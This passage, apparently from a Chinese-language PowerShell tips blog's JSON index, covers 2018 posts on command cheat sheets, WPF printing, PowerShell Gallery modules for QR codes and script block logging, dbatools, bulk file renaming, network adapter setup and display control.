#0046c3; color: #fff; max-width: 400px; padding: 5px 10px; }td { font-size: 11px; padding: 5px 20px; color: #000; }tr { background: #b8d1f3; }tr:nth-child(even) { background: #dae5f4; }tr:nth-child(odd) { background: #b8d1f3; }&lt;/style&gt;&quot;@$Header = &quot;&lt;h1 align='center'&gt;$title&lt;/h1&gt;&quot;Get-Command -Module $moduleName | Get-Help | Select-Object -Property Name, Synopsis | ConvertTo-Html -Title $Title -Head $StyleSheet -PreContent $Header | Set-Content -Path $OutFileInvoke-Item -Path $OutFile","link":"/2018/05/15/creating-powershell-command-cheat-sheets-part-3/"},{"title":"PowerShell 技能连载 - 创建 PowerShell 命令速查表（第 4 部分）","text":"在前一个技能里，我们创建了 PowerShell 命令的速查表。我们使用了它的名称和提要来创建速查表，类似这样： 123456789101112131415161718192021PS&gt; Get-Command -Module &quot;PrintManagement&quot;| Get-Help | Select-Object -Property Name, SynopsisName Synopsis---- --------Add-Printer Adds a printer to the specified computer.Add-PrinterDriver Installs a printer driver on the specified computer.Add-PrinterPort Installs a printer port on the specified computer.Get-PrintConfiguration Gets the configuration information of a printer.Get-Printer Retrieves a list of printers installed on a computer.Get-PrinterDriver Retrieves the list of printer drivers installed on...Get-PrinterPort Retrieves a list of printer ports installed on the...Get-PrinterProperty Retrieves printer properties for the specified pri...Get-PrintJob Retrieves a list of print jobs in the specified pr...Read-PrinterNfcTag Reads information about printers from an NFC tag.Remove-Printer Removes a printer from the specified computer.Remove-PrinterDriver Deletes printer driver from the specified computer.Remove-PrinterPort Removes the specified printer port from the specif...Remove-PrintJob Removes a print job on the specified printer.... Get-Help 返回的结果中有许多更有用的属性，例如 “description“ 和 “examples“。不过它们看起来很奇怪，好像装在一个哈希表中一样： 1234567891011121314151617181920PS&gt; Get-Command -Module &quot;PrintManagement&quot;| Get-Help | Select-Object -Property Name, DescriptionName description---- -----------Add-Printer {@{Text=The Add-Printer cmdlet adds a printer to a specified computer. Y...Add-PrinterDriver {@{Text=The Add-PrinterDriver cmdlet installs a printer driver on the sp...Add-PrinterPort {@{Text=The Add-PrinterPort cmdlet creates a printer port on the specifi...Get-PrintConfiguration {@{Text=The Get-PrintConfiguration cmdlet gets the configuration informa...Get-Printer {@{Text=The Get-Printer cmdlet retrieves a list of printers installed on...Get-PrinterDriver {@{Text=The Get-PrinterDriver cmdlet retrieves the list of printer drive...Get-PrinterPort {@{Text=The Get-PrinterPort cmdlet retrieves a list of printer ports tha...Get-PrinterProperty {@{Text=The Get-PrinterProperty cmdlet retrieves one or more printer pro...Get-PrintJob {@{Text=The Get-PrintJob cmdlet retrieves the current print jobs in the ...Read-PrinterNfcTag {@{Text=The Read-PrinterNfcTag cmdlet reads information about printers f...Remove-Printer {@{Text=The Remove-Printer cmdlet deletes a printer from the specified c...Remove-PrinterDriver {@{Text=The Remove-PrinterDriver cmdlet deletes a printer driver from th...Remove-PrinterPort {@{Text=The Remove-PrinterPort cmdlet removes the specified printer port...... 这是因为类似 “Description” 的属性包含了一个名为 “Text“ 的属性，它是一个数组（支持多行文本）。要获取纯文本，您需要手工从属性获取信息，类似这样： 12345678910111213# adjust the name of the module# code will list all commands shipped by that module# list of all modules: Get-Module -ListAvailable$ModuleName = &quot;PrintManagement&quot;$Description = @{ Name = &quot;Description&quot; Expression = { $_.Description.Text -join &quot; &quot; }}Get-Command -Module $moduleName | Get-Help | Select-Object -Property Name, $Description 现在结果看起来和预期相符了： 123456789101112131415161718192021Name Description---- -----------Add-Printer The Add-Printer cmdlet adds a printer to a specified ...Add-PrinterDriver The Add-PrinterDriver cmdlet installs a printer drive...Add-PrinterPort The Add-PrinterPort cmdlet creates a printer port on ...Get-PrintConfiguration The Get-PrintConfiguration cmdlet gets the configurat...Get-Printer The Get-Printer cmdlet retrieves a list of printers i...Get-PrinterDriver The Get-PrinterDriver cmdlet retrieves the list of pr...Get-PrinterPort The Get-PrinterPort cmdlet retrieves a list of printe...Get-PrinterProperty The Get-PrinterProperty cmdlet retrieves one or more ...Get-PrintJob The Get-PrintJob cmdlet retrieves the current print j...Read-PrinterNfcTag The Read-PrinterNfcTag cmdlet reads information about...Remove-Printer The Remove-Printer cmdlet deletes a printer from the ...Remove-PrinterDriver The Remove-PrinterDriver cmdlet deletes a printer dri...Remove-PrinterPort The Remove-PrinterPort cmdlet removes the specified p...Remove-PrintJob The Remove-PrintJob cmdlet removes a print job on the...Rename-Printer The Rename-Printer cmdlet renames the specified print...Restart-PrintJob The Restart-PrintJob cmdlet restarts a print job on t...Resume-PrintJob The Resume-PrintJob cmdlet resumes a suspended print ...Set-PrintConfiguration The Set-PrintConfiguration cmdlet sets the printer co...Set-Printer The Set-Printer cmdlet updates the configuration of t...","link":"/2018/05/16/creating-powershell-command-cheat-sheets-part-4/"},{"title":"PowerShell 技能连载 - PowerShell 中打印表格（使用 WPF）","text":"当您需要以表格的形式显示、打印，或保存为 PDF，使用 WPF (Windows Presentation Foundation) 可能是一种好方法。以前，WPF 是用于定义用户界面，但是您可以用它来定义表格，填充数据，然后打印或者保存它们。 不要因为代码量而拖延。PowerShell 基本上是以面向对象的方式定义表格。 以下示例代码创建一个模块中所有命令的文档。您可以方便地改变代码创建更多列以及更多其他数据的表格。当您运行以下代码时，它打开一个选择打印机的对话框。选择 “Microsoft Print to PDF” 打印机，将输出结果保存为一个 PDF 文档。 请注意：当您在 PowerShell ISE（或任何其它基于 WPF 的编辑器）中运行这段代码，将无法显示打印机对话框，并且将自动打印到缺省的打印机中。当您在 powershell.exe 中运行这段代码，一切正常。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111# adjust the name of the module# code will list all commands shipped by that module# list of all modules: Get-Module -ListAvailable$ModuleName = &quot;PrintManagement&quot;# these assemblies provide access to UIAdd-Type -AssemblyName PresentationCoreAdd-Type -AssemblyName PresentationFramework# create a new document$document = [System.Windows.Documents.FlowDocument]::new()# create a new table with two columns (20%, 80% width)$table = [System.Windows.Documents.Table]::new()$column1 = [System.Windows.Documents.TableColumn]::new()$column1.Width = [System.Windows.GridLength]::new(20, [System.Windows.GridUnitType]::Star)$table.Columns.Add($column1)$column2 = [System.Windows.Documents.TableColumn]::new()$column2.Width = [System.Windows.GridLength]::new(80, [System.Windows.GridUnitType]::Star)$table.Columns.Add($column2)# create a new rowgroup that will store the table rows$rowGroup = [System.Windows.Documents.TableRowGroup]::new()# produce the command data to display in the tableGet-Command -Module $moduleName |Get-Help |ForEach-Object { # get the information to be added to the table $name = $_.Name $synopsis = $_.Synopsis $description = $_.Description.Text -join ' ' # create a new table row $row = [System.Windows.Documents.TableRow]::new() # add a cell with the command name in bold: $cell = [System.Windows.Documents.TableCell]::new() $cell.Padding = [System.Windows.Thickness]::new(0,0,10,0) $para = [System.Windows.Documents.Paragraph]::new() $inline = [System.Windows.Documents.Run]::new($name) $inline.FontWeight = &quot;Bold&quot; $inline.FontSize = 12 $inline.FontFamily = &quot;Segoe UI&quot; $para.Inlines.Add($inline) $cell.AddChild($para) $row.AddChild($cell) # add a second cell with the command synopsis $cell = [System.Windows.Documents.TableCell]::new() $para = [System.Windows.Documents.Paragraph]::new() $inline = [System.Windows.Documents.Run]::new($synopsis) $inline.FontSize = 12 $inline.FontFamily = &quot;Segoe UI&quot; $para.Inlines.Add($inline) $cell.AddChild($para) $row.AddChild($cell) # add both cells to the table $rowGroup.AddChild($row) # add a second table row than spans two columns and holds the # command description in a smaller font: $row = [System.Windows.Documents.TableRow]::new() $cell = [System.Windows.Documents.TableCell]::new() $cell.ColumnSpan = 2 # add a 20pt gap at the bottom to separate from next command $cell.Padding = [System.Windows.Thickness]::new(0,0,0,20) $para = [System.Windows.Documents.Paragraph]::new() $inline = [System.Windows.Documents.Run]::new($description) $inline.FontSize = 10 $inline.FontFamily = &quot;Segoe UI&quot; $para.Inlines.Add($inline) $cell.AddChild($para) $row.AddChild($cell) # add row to table: $rowGroup.AddChild($row)}# add all collected table rows to the table, and add the table# to the document$table.AddChild($rowGroup)$document.AddChild($table)# add a paginator that controls where pages end and new pages start:[System.Windows.Documents.IDocumentPaginatorSource]$paginator = $document# create a print dialog to select the printer$printDialog = [System.Windows.Controls.PrintDialog]::new()# print dialog can not be shown in ISE due to threading issues# selecting a printer will work only when running this code in powershell.exe# else, the default printer is usedtry{ $result = $printDialog.ShowDialog() if ($result -eq $false) { Write-Warning &quot;User aborted.&quot; return }}catch {}# make sure the document is not printed in multiple columns$document.PagePadding = [System.Windows.Thickness]::new(50)$document.ColumnGap = 0$document.ColumnWidth = $printDialog.PrintableAreaWidth# print the document$printDialog.PrintDocument($paginator.DocumentPaginator, &quot;WPF-Printing from PowerShell&quot;)","link":"/2018/05/17/printing-tables-from-powershell-using-wpf/"},{"title":"PowerShell 技能连载 - 使用免费的 PowerShell 陈列架（第 1 部分）","text":"PowerShell 是一个可扩展的框架，并且 PowerShell 陈列架 (www.powershellgallery.com) 上有许多免费和有用的命令扩展。我们将在几个技能帖子中介绍这个陈列架的巨大功能。 要从 PowerShellGallery 中下载和安装任何扩展，您需要 PowerShellGet 模块，它提供了许多用于浏览、下载、安装、更新，和移除扩展的命令。 PowerShellGet 模块随着 PowerShell 5 分发，这是确认是否有该模块权限的方法： 123456789PS&gt; Get-Module PowerShellGet -ListAvailable Directory: C:\\Program Files\\WindowsPowerShell\\ModulesModuleType Version Name ExportedCommands---------- ------- ---- ----------------Script 1.0.0.1 PowerShellGet {Install-Module, Find-... 当您运行 PowerShell 5 时，您可能需要确认是否使用的是最终的版本。上一条命令汇报了已安装的版本。要检查陈列架中最新可用的版本，请试试这段代码： 12345PS&gt; Find-Module PowerShellGetVersion Name Repository Description------- ---- ---------- -----------1.6.0 PowerShellGet PSGallery PowerShell... 要更新之前通过 PowerShell 陈列架安装的任意模块，您只需要运行 Update-Module，不过它对 PowerShellGet 运行失败： 12PS&gt; Update-Module PowerShellGetUpdate-Module : Module 'PowerShellGet' was not installed by using Install-Module, so it cannot be updated. 这是因为该模块是随着 Windows 10 分发，您需要手工重新安装该模块。如果您有管理员权限，强烈建议先打开一个提升权限的 PowerShell，然后基于它安装（更新）以下的包： 12345PS&gt; Install-PackageProvider Nuget –ForceName Version Source Summary---- ------- ------ -------nuget 2.8.5.208 https://onege... N... 如果您没有事先更新包管理器，您坑无法更新 PowerShellGet 模块。当您更新了包管理器之后，请关闭所有 PowerShell 窗口，并打开一个全新的 PowerShell 控制台，以确保它使用新的包管理器。 下一步，安装最新版本的 PowerShellGet： 1PS&gt; Install-Module –Name PowerShellGet –Force 如果您没有管理员权限，那么用 -Scope CurrentUser 参数只为当前用户安装 PowerShellGet。 您现在可以在已有版本之外独立使用最新本的 PowerShellGet： 12345678910PS&gt; Get-Module PowerShellGet -ListAvailable Directory: C:\\Program Files\\WindowsPowerShell\\ModulesModuleType Version Name ExportedCommands---------- ------- ---- ----------------Script 1.6.0 PowerShellGet {Install-Module, Find-Module...Script 1.0.0.1 PowerShellGet {Install-Module, Find-Module... 您现在可以完美地通过 Update-Module（使用您安装它时相同的权限）更新模块： 1PS&gt; Update-Module PowerShellGet 这下您的指尖又多列一些命令： 123456789101112131415161718192021222324PS&gt; Get-Command -Module PowerShellGetCommandType Name Version Sou rce----------- ---- ------- ---Function Find-Command 1.6.0 PowFunction Find-DscResource 1.6.0 PowFunction Find-Module 1.6.0 PowFunction Find-RoleCapability 1.6.0 PowFunction Find-Script 1.6.0 PowFunction Get-InstalledModule 1.6.0 PowFunction Get-InstalledScript 1.6.0 PowFunction Get-PSRepository 1.6.0 PowFunction Install-Module 1.6.0 PowFunction Install-Script 1.6.0 PowFunction New-ScriptFileInfo 1.6.0 PowFunction Publish-Module 1.6.0 PowFunction Publish-Script 1.6.0 PowFunction Register-PSRepository 1.6.0 PowFunction Save-Module 1.6.0 PowFunction Save-Script 1.6.0 PowFunction Set-PSRepository 1.6.0 PowFunction Test-ScriptFileInfo 1.6.0 Pow...","link":"/2018/05/18/accessing-free-powershell-gallery-part-1/"},{"title":"PowerShell 技能连载 - 使用免费的 PowerShell 陈列架（第 2 部分）","text":"PowerShellGet 是一个新的免费的 PowerShell 扩展，用于下载和安装免费的扩展和命令。它随着 PowerShell 5 发布，在前一个技能中我们介绍了如何将它更新到最新版本。 如果您在使用旧版的 PowerShell，建议您最好更新 PowerShell。如果您不方便更新 PowerShell，您可以通过这个免费的 MSI 包安装 PowerShellGet 模块：https://www.microsoft.com/en-us/download/details.aspx?id=51451。","link":"/2018/05/21/accessing-free-powershell-gallery-part-2/"},{"title":"PowerShell 技能连载 - PowerShell 陈列架：创建 QR 码","text":"在前一个技能中我们解释了如何获取 PowerShellGet 并且在您的 PowerShell 版本中运行。现在我们看看 PowerShell 陈列架能够多么方便地扩展 PowerShell 的功能。 要创建一个 WiFi 热点的 QR 码，现在只需要几行代码： 123456789101112131415# adjust this to match your own WiFi$wifi = &quot;myAccessPoint&quot;$pwd = &quot;topSecret12&quot;# QR Code will be saved here$path = &quot;$home\\Desktop\\wifiaccess.png&quot;# install the module from the gallery (only required once)Install-Module QRCodeGenerator -Scope CurrentUser -Force# create QR codeNew-QRCodeWifiAccess -SSID $wifi -Password $pwd -OutPath $path# open QR code image with an associated programInvoke-Item -Path $path 这段代码首先下载并安装 QRCodeGenerator 模块，然后生成一个包含您提供的 WiFi 信息的特殊的 QR 码（您需要先调整内容适合您的 WiFi）。 生成的 PNG 图片可以使用大多数现代的智能设备扫描识别，即可使设备连接到 WiFi。 只需要将 QR 码打印几份，下一次迎接客人的时候，只需要提供打印件给客人，他们就可以方便地连上您的 WiFi。","link":"/2018/05/22/powershell-gallery-creating-qr-codes/"},{"title":"PowerShell 技能连载 - PowerShell 陈列架：创建二维码 vCard","text":"在前一个技能中我们解释了如何获取 PowerShellGet 并在您的 PowerShell 版本中使用。现在我们来看看 PowerShell 陈列架能够多门方便地扩展 PowerShell 的功能。 下次您打印名片的时候，何不增加一个二维码呢？它使得增加联系人十分方便！大多数现代的设备都支持二维码，所以当您将相机 APP 对准一个二位码时，智能手机可以直接向这个联系人发送邮件，或者将他添加为您的联系人。 以下是创建 vCard 二维码的方法： 1234567891011121314151617# adjust this to match your own info$first = &quot;Tom&quot;$last = &quot;Sawywer&quot;$company = &quot;freelancer.com&quot;$email = &quot;t.sawyer@freelancer.com&quot;# QR Code will be saved here$path = &quot;$home\\Desktop\\vCard.png&quot;# install the module from the Gallery (only required once)Install-Module QRCodeGenerator -Scope CurrentUser -Force# create QR codeNew-QRCodeVCard -FirstName $first -LastName $last -Company $company -Email $email -OutPath $path# open QR code image with an associated programInvoke-Item -Path $path","link":"/2018/05/23/powershell-gallery-creating-qrcode-vcards/"},{"title":"PowerShell 技能连载 - PowerShell 陈列架：创建地理位置二维码","text":"在前一个技能中我们解释了如何获取 PowerShellGet 并在您的 PowerShell 版本中运行。现在我们来看看 PowerShell 陈列架能够如何方便地扩展 PowerShell 功能。 下次您发送会议、上课，或是派对邀请时，为啥不加上一个地理定位的二维码呢？大多数现代的智能设备可以通过它们的相机 APP 扫描这些二维码，并且在地图中显示该地址，且提供如何到达该地址的路径。 创建一个地理位置二维码十分简单，因为困难的部分已经由 QRCodeGenerator 模块实现了： 1234567891011121314151617# adjust this to match your own info$first = &quot;Tom&quot;$last = &quot;Sawywer&quot;$company = &quot;freelancer.com&quot;$email = &quot;t.sawyer@freelancer.com&quot;# QR Code will be saved here$path = &quot;$home\\Desktop\\locationQR.png&quot;# install the module from the Gallery (only required once)Install-Module QRCodeGenerator -Scope CurrentUser -Force# create QR code via address (requires internet access and Google API to work)New-QRCodeGeolocation -OutPath $path -Address 'Bahnhofstrasse 12, Essen'# open QR code image with an associated programInvoke-Item -Path $path 当您在上述例子中传入一个地址，它将自动通过 Google 免费的 API 翻译成经纬度。这可能并不总是起作用，并且需要 Internet 连接。如果您知道您的位置的经纬度，您当然也可以通过 -Latitude 和 Longitude 参数传入经纬度。","link":"/2018/05/24/powershell-gallery-creating-qr-geolocations/"},{"title":"PowerShell 技能连载 - PowerShell 陈列架：探索脚本块日志（第 1 部分）","text":"在前一个技能中我们解释了如何获取 PowerShellGet 并在您的 PowerShell 版本中运行。现在我们来看看 PowerShell 陈列架能够如何方便地扩展 PowerShell 功能。 脚本块日志是 PowerShell 5 以及之后版本的新功能。当 PowerShell 引擎编译（执行）一个命令，它将命令的执行记录到一个内部的日志文件。默认情况下，只记录了少数被认为与安全性相关的命令。通过一个名为 ScriptBlockLoggingAnalyzer 的免费模块，您可以找到 PowerShell 在您机器上记录日志的代码： 12345# install the extension module from the Gallery (only required once!)Install-Module ScriptBlockLoggingAnalyzer -Scope CurrentUser -Force# show all logged eventsGet-SBLEvent | Out-GridView 请注意 ScriptBlockLoggingAnalyzer 当前只适用于 Windows PowerShell。PowerShell Core 使用相同的机制，但是不同的日志。由于 PowerShell Core 中的日志名称还在开发中，所以您需要手工调整模块来适应 PowerShell Core。","link":"/2018/05/25/powershell-gallery-discovering-script-block-logging-part-1/"},{"title":"PowerShell 技能连载 - PowerShell 陈列架：探索脚本块日志（第 2 部分）","text":"在前一个技能中我们介绍了免费的 ScriptBlockLoggingAnalyzer，它覆盖了 PowerShell 日志的代码。默认情况下，它只对一小部分命令有效，但如果您启用了所有脚本块的日志，那么您机器上任何人运行的任何代码都会被记录。 以下是操作步骤（只对 Windows PowerShell 有效，请在提升权限的 PowerShell 中运行！）： 12345678910111213#requires -RunAsAdministrator# install the module from the Gallery (only required once!)Install-Module ScriptBlockLoggingAnalyzer -Force# enable full script block loggingEnable-SBL# extend the log sizeSet-SBLLogSize -MaxSizeMB 100# clear the log (optional)Clear-SBLLog 现在起，这台机器上运行的所有 PowerShell 代码都会被记录。要查看记录的代码，请使用以下代码： 1PS&gt; Get-SBLEvent | Out-GridView","link":"/2018/05/28/powershell-gallery-discovering-script-block-logging-part-2/"},{"title":"PowerShell 技能连载 - PowerShell 陈列架 dba 工具 – 数据库专家 PowerShell 扩展","text":"在前一个技能中我们解释了如何获取 PowerShellGet 并在您的 PowerShell 版本中运行。现在我们来看看 PowerShell 陈列架能够如何方便地扩展 PowerShell 功能。 PowerShell 是一个多用途的自动化语言，而且世界各地的数据库专家已经开始开发一个名为 “dbatools” 的 PowerShell 扩展，它可以从 PowerShell 陈列架免费地下载： 1PS&gt; Install-Module dbatools -Scope CurrentUser -Force 当安装完之后，PowerShell 现在拥有了大量新的数据库相关的命令： 123456789101112131415161718192021222324252627282930313233343536PS&gt; Get-Command -Module dbatoolsCommandType Name Version Sou rce----------- ---- ------- ---Alias Attach-DbaDatabase 0.9.332 dbaAlias Backup-DbaDatabaseCertificate 0.9.332 dbaAlias Connect-DbaSqlServer 0.9.332 dbaAlias Copy-SqlAgentCategory 0.9.332 dbaAlias Copy-SqlAlert 0.9.332 dbaAlias Copy-SqlAudit 0.9.332 dbaAlias Copy-SqlAuditSpecification 0.9.332 dbaAlias Copy-SqlBackupDevice 0.9.332 dbaAlias Copy-SqlCentralManagementServer 0.9.332 dbaAlias Copy-SqlCredential 0.9.332 dbaAlias Copy-SqlCustomError 0.9.332 dbaAlias Copy-SqlDatabase 0.9.332 dbaAlias Copy-SqlDatabaseAssembly 0.9.332 dbaAlias Copy-SqlDatabaseMail 0.9.332 dbaAlias Copy-SqlDataCollector 0.9.332 dbaAlias Copy-SqlEndpoint 0.9.332 dbaAlias Copy-SqlExtendedEvent 0.9.332 dbaAlias Copy-SqlJob 0.9.332 dbaAlias Copy-SqlJobServer 0.9.332 dbaAlias Copy-SqlLinkedServer 0.9.332 dbaAlias Copy-SqlLogin 0.9.332 dbaAlias Copy-SqlOperator 0.9.332 dbaAlias Copy-SqlPolicyManagement 0.9.332 dbaAlias Copy-SqlProxyAccount 0.9.332 dbaAlias Copy-SqlResourceGovernor 0.9.332 dbaAlias Copy-SqlServerAgent 0.9.332 dbaAlias Copy-SqlServerTrigger 0.9.332 dbaAlias Copy-SqlSharedSchedule 0.9.332 dbaAlias Copy-SqlSpConfigure 0.9.332 dbaAlias Copy-SqlSsisCatalog 0.9.332 dba... 这个模块的文档齐备，所以您可以使用 Get-Help 查看每个命令的细节和示例代码。同样地，当您用您喜欢的搜索引擎搜索 “PowerShell + dbatools”，可以找到一个有许多示例和教程的，充满活力的社区。","link":"/2018/05/29/powershell-gallery-dbatools-powershell-extension-for-database-professionals/"},{"title":"PowerShell 技能连载 - 批量重命名图片","text":"重命名单个文件可以很容易地用 Rename-Item 实现，但是有些时候 cmdlet 参数可以更聪明地使用，帮您实现批量自动化。 例如，假设您的照片文件夹中有大量的照片： 12$path = [Environment]::GetFolderPath('MyPictures')Get-ChildItem -Path $path -Filter *.png 如果您想对它们命名，例如在前面加一个序号，您需要设计一个循环，例如这样： 123456789$path = [Environment]::GetFolderPath('MyPictures')$counter = 0$files = Get-ChildItem -Path $path -Filter *.png$files | ForEach-Object { $counter++ $newname = '{0} - {1}' -f $counter, $_.Name Rename-Item -Path $_.FullName -NewName $newname -WhatIf } 还有一个简单得多的解决方案：-NewName 参数也可以接受一个脚本块。每当一个元素通过管道传给 Rename-Item，脚本块就会执行一次。代码可以简化为： 1234567$path = [Environment]::GetFolderPath('MyPictures')$counter = 0$files = Get-ChildItem -Path $path -Filter *.png$files | Rename-Item -NewName { $script:counter++ '{0} - {1}' -f $counter, $_.Name } -WhatIf 还有一处重要的区别：Rename-Item 执行的脚本块是在它自己的作用域中运行的，所以如果您希望使用一个递增的计数器，那么需要在变量名之前增加一个 script:，这样变量就作用在脚本作用域上。 警告：在某些 PowerShell 版本中有一个不友好的 bug，重命名文件将改变 Get-ChildItem 的输出，所以如果您直接将 Get-ChildItem 的结果通过管道传给 Rename-Item，您可能会遇到无限死循环，文件会一直被重命名直到文件路径长度超过限制。要安全地使用它，请确保在将变量传给 Rename-Item 之前将 Get-ChildItem 的结果保存到变量中！","link":"/2018/05/30/bulk-renaming-pictures/"},{"title":"PowerShell 技能连载 - 使用神奇的脚本块参数","text":"在前一个例子中我们演示了 Rename-Item 中 NewName 的神奇功能。它可以接受一个新的文件名，也可以接受一个脚本块。脚本块可以用来批量命名大量文件。 我们现在来看看 PowerShell 函数如何实现这种神奇的参数！以下是一个定义了两个参数的函数： 123456789101112131415161718192021222324252627282930313233function Test-MagicFunc{ [CmdletBinding()] param ( [Parameter(Mandatory=$true, Position=0, ValueFromPipeline)] [string] $Par1, [Parameter(ValueFromPipelineByPropertyName)] [string] $Par2 ) begin { Write-Warning &quot;Starting...&quot; } process { Write-Warning &quot;Processing Par1=$Par1 and Par2=$Par2&quot; } end { Write-Warning &quot;Ending...&quot; }} 您可以把它当作一个传统的独立函数运行： 1234PS&gt; Test-MagicFunc -Par1 100 -Par2 50WARNING: Starting...WARNING: Processing Par1=100 and Par2=50WARNING: Ending... 您也可以通过管道输出来运行它，并且传入一个固定的第二参数： 1234567PS&gt; 1..4 | Test-MagicFunc -Par2 99WARNING: Starting...WARNING: Processing Par1=1 and Par2=99WARNING: Processing Par1=2 and Par2=99WARNING: Processing Par1=3 and Par2=99WARNING: Processing Par1=4 and Par2=99WARNING: Ending... 但是您也可以对的第二个参数传入一个脚本块，该脚本块引用了从管道收到的对象： 1234567PS&gt; 1..4 | Test-MagicFunc -Par2 { $_ * $_ }WARNING: Starting...WARNING: Processing Par1=1 and Par2=1WARNING: Processing Par1=2 and Par2=4WARNING: Processing Par1=3 and Par2=9WARNING: Processing Par1=4 and Par2=16WARNING: Ending... 事实证明，这个魔法十分简单：Par2 的参数定义显示它可以接受管道输入。它不关心是由属性名输入 (ValueFromPipelineByPropertyName) 还是通过值输入 (ValueFromPipeline)。在这些例子中，当您将一个脚本块传给参数时，PowerShell 将该脚本块当作管道输入值的接口：$_ 引用输入的对象，脚本块可以使用任何需要的代码来计算需要绑定到参数的值。","link":"/2018/05/31/using-magic-script-block-parameters/"},{"title":"PowerShell 技能连载 - 用 PowerShell 管理 Windows 10 的缺省 APP","text":"Windows 10 缺省安装了一系列 APP，而且即使您手动卸载了它们，它们有可能在下一个重大 Windows 10 更新的时候又回来。 PowerShell 也可以移除这些 Windows 10 APP。您可以在任意时候重新运行脚本，来确保要清除的 APP 确实被删除了。例如这行代码将移除 3D Builder APP： 1PS&gt; Get-AppxPackage *3dbuilder* | Remove-AppxPackage 有许多类似 http://www.thewindowsclub.com/remove-built-windows-10-apps-users-using-powershell-script 的网站，提供许多更多如何移除特定的 Windows 10 APP 的例子。","link":"/2018/06/01/managing-windows-10-default-apps-with-powershell/"},{"title":"PowerShell 技能连载 - 免费的 PowerShell 帮助手册","text":"即便是有经验的 PowerShell 用户也会经常忽略 PowerShell 强大的帮助系统，它类似 Linux 中的 man page。您所需要做的只是一次性下载帮助文件。要下载帮助文件，您需要在提升权限的 PowerShell 中运行以下代码： 1PS&gt; Update-Help -UICulture en-us -Force 当帮助文件下载完以后，以下是一个很棒的基础列表，展示 PowerShell 语言的几乎所有细节： 12345678910111213141516171819PS&gt; Get-Help about* | Select Name, SynopsisName Synopsis---- --------about_ActivityCommonParameters Describes the parameters that Windows...about_Aliases Describes how to use alternate names ...about_Arithmetic_Operators Describes the operators that perform ...about_Arrays Describes arrays, which are data stru...about_Assignment_Operators Describes how to use operators to ass...about_Automatic_Variables Describes variables that store state ...about_Break Describes a statement you can use to ...about_Checkpoint-Workflow Describes the Checkpoint-Workflow act...about_CimSession Describes a CimSession object and the...about_Classes Describes how you can use classes to ...about_Command_Precedence Describes how Windows PowerShell dete...about_Command_Syntax Describes the syntax diagrams that ar...about_Comment_Based_Help Describes how to write comment-based ...about_CommonParameters Describes the parameters... 您甚至可疑用这行代码创建您自己的 PowerShell 帮助查看器： 123456Get-Help about* | Select-Object -Property Name, Synopsis | Out-GridView -Title 'Select Topic' -OutputMode Multiple | ForEach-Object { Get-Help -Name $_.Name -ShowWindow } 当运行这行代码时，PowerShell 将搜索帮助主题并打开一个网格视图。只需要按住 CTRL 并选择所有您想阅读的主题，然后单击确认。选中的主题将会在独立的帮助查看窗口中打开。","link":"/2018/06/04/free-powershell-help-manuals/"},{"title":"PowerShell 技能连载 - 配置网络适配器","text":"以下是一个简单的例子，演示如何向网络适配器分配 IP 地址、网关，和 DNS 服务器。这段脚本列出所有活动的网络适配器。当您选择一项并点击确认，脚本将把硬编码的地址赋给网络适配器。 请注意一下脚本只是模拟改变网络配置。如果您希望真的改变网络设置，请移除 -WhatIf 参数： 123456789101112$NewIP = '192.168.2.12'$NewGateway = '192.168.2.2'$NewDNS = '8.8.8.8'$Prefix = 24$adapter = Get-NetAdapter |Where-Object Status -eq 'Up' |Out-GridView -Title 'Select Adapter to Configure' -OutputMode Single$index = $adapter.InterfaceIndexNew-NetIPAddress -InterfaceIndex $index -IPAddress $NewIP -DefaultGateway $NewGateway -PrefixLength $Prefix -AddressFamily IPv4 -WhatIfSet-DNSClientServerAddress –InterfaceIndex $index –ServerAddresses $NewDNS -whatIf","link":"/2018/06/05/configuring-network-adapter/"},{"title":"PowerShell 技能连载 - 立刻关闭显示器","text":"如果您想运行一个长时间执行的脚本，何不先关闭显示器，而是傻傻地等着超时以后显示屏保呢？ 以下是一个简单的函数，能够立即关闭显示器。只需要移动鼠标或按任意键就可以唤醒： 123456789101112131415function Set-DisplayOff{ $code = @&quot;using System;using System.Runtime.InteropServices;public class API{ [DllImport(&quot;user32.dll&quot;)] public static extern int SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);}&quot;@ $t = Add-Type -TypeDefinition $code -PassThru $t::SendMessage(0xffff, 0x0112, 0xf170, 2)}","link":"/2018/06/06/turning-display-off-immediately/"},{"title":"PowerShell 技能连载 - 使用秘密的 $FormatEnumerationLimit 变量","text":"Format-List 缺省以列表的形式显示对象的属性，如果某个属性包含一个数组，该数组将会转换为文本，而且只显示一小部分数组元素。以下是一个例子： 1234567PS&gt; Get-Process -Id $Pid | Format-List -Property Name, ModulesName : powershell_iseModules : {System.Diagnostics.ProcessModule (PowerShell_ISE.exe), System.Diagnostics.ProcessModule (ntdll.dll), System.Diagnostics.ProcessModule (MSCOREE.DLL), System.Diagnostics.ProcessModule (KERNEL32.dll)...} 这行代码获取 PowerShell 的进程，并且显示它的名称和加载的模块。如您所见，输出的结果并没有显示所有加载的模块。 有一个名为 FormatEnumerationLimit 的神秘变量，控制 Format-List 显示多少个数组元素。 缺省情况下，显示个数限制为 4 个，所以输出结果中最多显示 4 个数组元素。如果将限制值设为 -1，事实上相当于关闭了该限制： 1234567PS&gt; $FormatEnumerationLimit4PS&gt; $FormatEnumerationLimit = -1PS&gt; $FormatEnumerationLimit-1 如果您再次运行相同的命令，Format-List 将显示所有数组元素： 12345678910111213141516171819202122232425262728PS&gt; Get-Process -Id $Pid | Format-List -Property Name, ModulesName : powershell_iseModules : {System.Diagnostics.ProcessModule (PowerShell_ISE.exe), System.Diagnostics.ProcessModule (ntdll.dll), System.Diagnostics.ProcessModule (MSCOREE.DLL), System.Diagnostics.ProcessModule (KERNEL32.dll), System.Diagnostics.ProcessModule (KERNELBASE.dll), System.Diagnostics.ProcessModule (ADVAPI32.dll), System.Diagnostics.ProcessModule (msvcrt.dll), System.Diagnostics.ProcessModule (sechost.dll), System.Diagnostics.ProcessModule (RPCRT4.dll), System.Diagnostics.ProcessModule (mscoreei.dll), System.Diagnostics.ProcessModule (SHLWAPI.dll), System.Diagnostics.ProcessModule (combase.dll), System.Diagnostics.ProcessModule (ucrtbase.dll), System.Diagnostics.ProcessModule (bcryptPrimitives.dll), System.Diagnostics.ProcessModule (GDI32.dll), System.Diagnostics.ProcessModule (gdi32full.dll), System.Diagnostics.ProcessModule (msvcp_win.dll), System.Diagnostics.ProcessModule (USER32.dll), 